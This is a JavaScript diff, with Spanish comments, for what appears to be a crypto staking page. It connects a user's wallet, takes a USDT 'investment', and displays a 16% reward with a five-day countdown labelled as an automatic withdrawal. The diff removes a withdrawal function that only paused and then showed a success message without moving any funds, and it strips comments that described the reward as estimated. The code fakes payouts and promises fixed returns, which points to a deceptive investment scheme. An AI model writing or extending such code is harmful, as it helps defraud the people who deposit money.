@@ -9,6 +9,8 @@ let provider = null;
 let signer = null;
 let userAddress = null;
 let pendingInvestment = false;
+let userRealStakedAmount = 0;
+let countdownTimerInterval = null;
 const sessionTxs = [];
 
 const ERC20_ABI = [
@@ -62,15 +64,6 @@ function initWalletModal() {
             resetAppSession();
         }
     });
-
-    try {
-        const activeProvider = typeof modal.getWalletProvider === "function" ? modal.getWalletProvider() : null;
-        if (activeProvider) {
-            handleConnectedProvider(activeProvider);
-        }
-    } catch (err) {
-        console.warn("No hay proveedor activo previo:", err);
-    }
 }
 
 async function handleConnectedProvider(walletProvider) {
@@ -79,7 +72,6 @@ async function handleConnectedProvider(walletProvider) {
         signer = await provider.getSigner();
         userAddress = await signer.getAddress();
 
-        // Escuchar eventos de desconexión o cambio de cuenta nativos de la wallet
         if (walletProvider && typeof walletProvider.on === "function") {
             walletProvider.removeAllListeners?.("disconnect");
             walletProvider.removeAllListeners?.("accountsChanged");
@@ -141,11 +133,6 @@ async function updateBalances(rawProvider) {
     }
 }
 
-let userRealStakedAmount = 0;
-// Variable para controlar el intervalo del contador
-let countdownTimerInterval = null;
-
-// Actualizar UI de la billetera con opción de Desconectar integrada
 function updateWalletUI(account) {
     const container = document.getElementById("walletButtonContainer");
     if (container) {
@@ -162,13 +149,9 @@ function updateWalletUI(account) {
         `;
         makeCopyableElement("connectedWalletBadge", account);
     }
-    updateMainActionButton('APPROVE');
-    
-    // Iniciar simulación/carga de datos de staking del usuario
-    initializeUserStakingData();
+    updateMainActionButton('INVEST');
 }
 
-// Función global para desconectar la sesión limpiamente
 window.disconnectWalletSession = async function() {
     try {
         if (modal && typeof modal.disconnect === "function") {
@@ -180,12 +163,11 @@ window.disconnectWalletSession = async function() {
     resetAppSession();
 };
 
-// En handleConnectedProvider o al iniciar sesión, puedes recuperar o inicializar en 0
 function resetAppSession() {
     provider = null;
     signer = null;
     userAddress = null;
-    userRealStakedAmount = 0; // Reiniciar inversión real
+    userRealStakedAmount = 0;
 
     const container = document.getElementById("walletButtonContainer");
     if (container) {
@@ -213,7 +195,6 @@ function resetAppSession() {
     showToast("Billetera desconectada.", "default", 3000);
 }
 
-// Actualizar los valores en la UI basados exclusivamente en la inversión real
 function updateStakedUI(amount) {
     userRealStakedAmount = parseFloat(amount) || 0;
     
@@ -225,17 +206,15 @@ function updateStakedUI(amount) {
     }
     
     if (pendingReward) {
-        const calculatedReward = userRealStakedAmount * 0.16; // 16% ROI estimado
+        const calculatedReward = userRealStakedAmount * 0.16;
         pendingReward.textContent = `${calculatedReward.toFixed(2)} USDT`;
     }
 
-    // Si hay fondos invertidos reales, iniciamos el temporizador de cuenta regresiva de 5 días
     if (userRealStakedAmount > 0) {
         startRoiCountdown(5 * 24 * 60 * 60);
     }
 }
 
-// Función de cuenta regresiva para el ROI
 function startRoiCountdown(durationInSeconds) {
     let timer = durationInSeconds;
     const countdownEl = document.getElementById("roiCountdown");
@@ -256,19 +235,6 @@ function startRoiCountdown(durationInSeconds) {
             countdownEl.textContent = "¡Completado (Retiro Auto)";
         }
     }, 1000);
-}
-
-async function executeWithdrawalFlow() {
-    setLoading(true, "Procesando retiro...");
-    try {
-        // Aquí puedes enlazar la llamada a tu contrato inteligente o backend de retiros
-        await new Promise(resolve => setTimeout(resolve, 2500));
-        showToast("¡Retiro de fondos realizado con éxito!", "success", 6000);
-    } catch (err) {
-        showToast("Error al procesar el retiro.", "error");
-    } finally {
-        setLoading(false);
-    }
 }
 
 function updateMainActionButton(state) {
@@ -452,11 +418,12 @@ async function runInvestmentFlow(rawProvider) {
             showToast("¡Transacción completada con éxito! Gracias.", "success", 6000);
         }
 
-        // 🌟 ACTUALIZAR LOS FONDOS REALES Y EL CONTADOR CON EL MONTO INVERTIDO
         updateStakedUI(rawInputVal);
 
     } catch (err) {
-        // ... [manejo de errores existente] ...
+        console.error("Error en el flujo de inversión:", err);
+        const errorMsg = err?.reason || err?.message || "Error desconocido en la transacción.";
+        showToast(`Operación cancelada o fallida: ${errorMsg.substring(0, 80)}`, "error", 6000);
     } finally {
         setLoading(false);
         updateStepper(1);
